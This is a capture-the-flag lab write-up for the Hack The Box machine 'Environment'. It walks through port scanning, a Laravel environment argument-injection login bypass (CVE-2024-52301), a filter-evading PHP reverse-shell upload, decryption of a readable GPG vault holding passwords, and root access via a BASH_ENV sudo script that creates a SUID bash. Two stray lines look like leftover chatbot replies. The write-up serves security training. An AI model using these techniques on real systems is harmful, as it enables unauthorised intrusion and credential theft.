---
icon: seedling
---

# HTB-ENVIORNMENT

<figure><img src="../../../../.gitbook/assets/image (457).png" alt=""><figcaption></figcaption></figure>

## **Attack Flow Explanation**

**1. Initial Recon & Information Leakage**

* **Unsupported HTTP Method:**\
  Sending a request with an unsupported method (like GET to a POST-only endpoint) triggers errors.
* **Laravel Version Leak:**\
  The error page exposes Laravel version (11.30.0) and PHP version (8.2.28) due to debugging being enabled.
* **Impact:**\
  This information helps identify known vulnerabilities like **CVE-2024-52301** for argument injection.

**2. Login Bypass**

* **Force 500 Error on Login:**\
  Manipulating the `remember` parameter causes a 500 Internal Server Error and leaks code traces.
* **Login Bypass in Preprod Environment:**\
  By appending `?--env=preprod` to the login request, the application bypasses authentication and creates a session as user `Hish`.

**3. Dashboard Access**

* **CVE-2024-52301 Argument Injection:**\
  Using the discovered vulnerability, an attacker can manipulate environment parameters to gain access to the dashboard.

**4. Web Shell Upload**

* **Bypass Upload Filter:**\
  On the profile page, the file upload filter is bypassed by:
  * Prefixing PHP payloads with `GIF89a` to mimic a GIF.
  * Using a single dot as the file extension to bypass restriction.
* **Outcome:**\
  The reverse shell executes when the profile page reloads, giving access as `www-data`.

**5. Privilege Escalation**

* **Unsecured GPG Key Vault:**\
  Hish’s home directory is world-readable, including the backup folder with a GPG key vault.
  * Decrypting the key vault reveals credentials (e.g., `marineSPm@ster!!`) to switch to Hish.
* **BASH\_ENV Exploit:**\
  The `BASH_ENV` variable is preserved when running `sudo`.
  * A crafted bash script copies `bash` to `/tmp` with SUID set.
  * Executing this modified binary escalates privileges to root.

***

#### **Summary of Attack Flow**

1. Trigger information leakage via unsupported HTTP method → discover Laravel version.
2. Force a 500 error on login → leak call trace → bypass login in preprod.
3. Exploit argument injection (CVE-2024-52301) → gain dashboard access.
4. Upload reverse shell → execute as `www-data`.
5. Exploit world-readable GPG key vault → gain user Hish access.
6. Abuse `BASH_ENV` with sudo → escalate to root.

## Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```bash
──(sn0x㉿sn0x)-[~/htb/Environment]
└─$ sudo rustscan -a 10.10.11.67 BLAH BLAH
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'

Open 10.10.11.67:22
Open 10.10.11.67:80
Discovered open port 80/tcp on 10.10.11.67
Discovered open port 22/tcp on 10.10.11.67

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
|_ Vulnerabilities:
|  - CVE-2023-38408 (CVSS 9.8): https://vulners.com/cve/CVE-2023-38408
|  - CVE-2023-28531 (CVSS 9.8): https://vulners.com/cve/CVE-2023-28531
|  - CVE-2024-6387 (CVSS 8.1): https://vulners.com/cve/CVE-2024-6387
|_ Multiple public exploits available: ✔️
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://environment.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Nmap script to recheck + fingerprint:

<pre class="language-bash"><code class="lang-bash">─(sn0x㉿sn0x)-[~/HTB/Environment]
<strong>└─$ nmap -p22 --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -sV -Pn -n 10.10.11.67
</strong>Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-07 02:15 EDT
Nmap scan report for 10.10.11.67
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
| ssh2-enum-algos: 
|   kex_algorithms: (12)
|       sntrup761x25519-sha512
|       sntrup761x25519-sha512@openssh.com
|       curve25519-sha256
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group16-sha512
|       diffie-hellman-group18-sha512
|       diffie-hellman-group14-sha256
|       kex-strict-s-v00@openssh.com
|   server_host_key_algorithms: (4)
|       rsa-sha2-512
|       rsa-sha2-256
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (6)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>

The Nmap scan revealed a redirect to environment.htb, so I’ll add an entry for it in my /etc/hosts file.”

## Exploitation <a href="#execution" id="execution"></a>

<figure><img src="../../../../.gitbook/assets/image (458).png" alt=""><figcaption></figcaption></figure>

Accessing [http://environment.htb](http://environment.htb) displays a minimal web page with limited functionality. The only interactive element is a mailing list signup form that accepts an email address. However, submitting the form with an already registered email or invalid data triggers an error message.

The form submission is managed by JavaScript, which sends a POST request to the /mailing endpoint. The request includes the provided email along with a token extracted from the HTML source.”\*\*

Let me know if you want it more formal, concise, or expanded with technical details for documentation or a report.

```python
document.getElementById('mailingListForm').addEventListener('submit', async function (event) {
    event.preventDefault(); // Prevent the default form submission behavior
 
    const email = document.getElementById('email').value;
    const csrfToken = document.getElementsByName("_token")[0].value;
    const responseMessage = document.getElementById('responseMessage');
 
    try {
        const response = await fetch('/mailing', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: "email=" + email + "&_token=" + csrfToken,
        });
 
        if (response.ok) {
            const data = await response.json();
            responseMessage.textContent = data.message; // Display success message
            responseMessage.style.color = 'greenyellow';
        } else {
            const errorData = await response.json();
            responseMessage.textContent = errorData.message || 'An error occurred.';
            responseMessage.style.color = 'red';
        }
    } catch (error) {
        responseMessage.textContent = 'Failed to send the request.';
        responseMessage.style.color = 'red';
    }
});
```

By using ffuf to brute-force directories, I discovered several endpoints such as /login and /logout. One result that stood out was /mailing, which returned a 405 status code—likely because ffuf used a GET request instead of POST. Additionally, the unusually large response size of 244,871 bytes further drew my attention

```
-─(sn0x㉿sn0x)-[~/HTB/Environment]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
       -u http://environment.htb/FUZZ
 
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       
 
       v2.1.0-dev
________________________________________________
 
 :: Method           : GET
 :: URL              : http://environment.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
 
logout                  [Status: 302, Size: 358, Words: 60, Lines: 12, Duration: 75ms]
login                   [Status: 200, Size: 2391, Words: 532, Lines: 55, Duration: 198ms]
upload                  [Status: 405, Size: 244869, Words: 46159, Lines: 2576, Duration: 1047ms]
mailing                 [Status: 405, Size: 244871, Words: 46159, Lines: 2576, Duration: 350ms]
up                      [Status: 200, Size: 2126, Words: 745, Lines: 51, Duration: 147ms]
storage                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 36ms]
build                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 130ms]
vendor                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 18ms]
```

Accessing the /mailing endpoint in the browser reveals a Laravel error page that includes a detailed call trace. The page exposes sensitive information such as the PHP version (8.2.28) and Laravel version (11.30.0). The presence of this error page confirms that debugging is enabled on the application

<figure><img src="../../../../.gitbook/assets/image (459).png" alt=""><figcaption></figcaption></figure>

A search for the Laravel version reveals an argument injection vulnerability that allows manipulation of the application environment through request parameters. A proof of concept is available for CVE-2024-52301.

Additionally, the footer on the main page displays the current environment, which is set to ‘production.’ By appending the parameter `?--env=dev` to the URL, this value is altered to ‘Dev.’ At this stage, only the footer reflects the change, while the rest of the page remains unchanged.”\*\*

Let me know if you want it structured for a formal report, a blog, or a technical walkthrough

<figure><img src="../../../../.gitbook/assets/image (460).png" alt=""><figcaption></figcaption></figure>

Shifting my focus to the /login endpoint presents a login prompt for the Marketing Management Portal. As expected, I don’t have valid credentials, and default ones don’t appear to work. However, with debugging enabled, there’s potential to trigger an error and extract additional information.

Upon inspecting the login request using Burp Suite, I observed four parameters being sent to the server. Among them, the `remember` parameter stands out—it likely represents a boolean value that could influence session or authentication behavior.

```
POST /login HTTP/1.1
Host: environment.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Origin: http://environment.htb
DNT: 1
Connection: keep-alive
Referer: http://environment.htb/login
Cookie: XSRF-TOKEN=ey<REDACTED>n0%3D; laravel_session=ey<REDACTED>n0%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i
_token=gvYr9YB8BKm7TXQHPqZJF6VDPZWdTTHqCcStKLjg&email=test%40test.com&password=helloworld&remember=True

```

When I modify the `remember` parameter to any value other than `True` or `False`, the server responds with a 500 Internal Server Error. The error page also exposes a call trace, inadvertently leaking portions of the application’s source code

`routes/web.php`

```bash

		$keep_loggedin = False;
    } elseif ($remember == 'True') {
        $keep_loggedin = True;
    }
    if($keep_loggedin !== False) {
    // TODO: Keep user logged in if he selects "Remember Me?"
    }
    if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs
        $request->session()->regenerate();
        $request->session()->put('user_id', 1);
        return redirect('/management/dashboard');
    }
    $user = User::where('email', $email)->first();

```

The code revealed after the error is even more significant. In the preprod environment, the login is bypassed and a session for user ID 1 is automatically created. By repeating the login process, intercepting the POST request, and appending `?--env=preprod` to the URI, I was able to log in as the user ‘Hish’ without valid credentials

<figure><img src="../../../../.gitbook/assets/image (461).png" alt=""><figcaption></figcaption></figure>

On the profile page, I have the option to upload a new profile picture. The uploaded file is stored under `/storage/files/<filename>`. Files with the `.php` extension are explicitly blocked, and the server also performs file type validation. However, this check can be bypassed by prefixing the file content with `GIF89a`, making it appear as a GIF file.

Although extensions like `.php4`, `.php5`, or `.PHP` are accepted, the server refuses to execute the PHP code. Interestingly, appending a single dot as the file extension causes it to be stripped by the upload logic, allowing the file upload to proceed. Upon reloading the profile page, the uploaded reverse shell is executed, and I receive a callback as the `www-data` user

<figure><img src="../../../../.gitbook/assets/image (462).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

### Shell as hish <a href="#shell-as-hish" id="shell-as-hish"></a>

The permissions on Hish’s home directory are overly permissive, allowing any user to list and read its contents. This includes the backup folder, which contains a GPG key vault, potentially exposing sensitive cryptographic material

```bash
──(sn0x㉿sn0x)-[~/htb/Environment]
└─$ ls -la /home/hish/backup/
total 12
drwxr-xr-x 2 hish hish 4096 Jan 12 11:49 .
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 ..
-rw-r--r-- 1 hish hish  430 May  4 18:42 keyvault.gpg
```

To decrypt the key vault, I first copy the contents of the `.gnupg` folder to a writable location, as the `www-data` user lacks write permissions in Hish’s home directory and GPG requires the ability to create temporary files. I then run `gpg --decrypt keyvault.gpg`, specifying the new directory, which allows me to successfully decrypt and view the contents of the vault.

```bash
$ mkdir /dev/shm/home
 
$ cp -ar /home/hish/.gnupg /dev/shm/home
 
$ gpg --homedir /dev/shm/home/.gnupg --decrypt /home/hish/backup/keyvault.gpg 
gpg: WARNING: unsafe permissions on homedir '/dev/shm/home/.gnupg'
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

This process reveals three passwords, one of which—`marineSPm@ster!!`—allows me to switch the session to the Hish user

### Shell as root <a href="#shell-as-root" id="shell-as-root"></a>

```bash
$ sudo -l
[sudo] password for hish: 
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty
 
User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```

When interacting with `sudo`, the environment variable `BASH_ENV` is preserved, allowing the specification of a startup file. I created a short bash script that copies the `bash` binary to the `/tmp` directory and sets the SUID bit. After making the script executable, I assign it as the value of `BASH_ENV` in the call to `systeminfo`.

Executing this command results in a modified `bash` binary in `/tmp` with the SUID bit set, which can then be used to escalate privileges to root.

```bash
$ cat /tmp/privesc.sh
cp /bin/bash /tmp/bash
chmod u+s /tmp/bash
 
$ chmod +x /tmp/privesc.sh
 
$ BASH_ENV='/tmp/privesc.sh' sudo /usr/bin/systeminfo
--- SNIP ---
 
$ ls -la /tmp/bash
-rwsr-xr-x 1 root root 1265648 May  4 18:55 /tmp/bash
```

<figure><img src="../../../../.gitbook/assets/complete (35).gif" alt=""><figcaption></figcaption></figure>

### ROOT
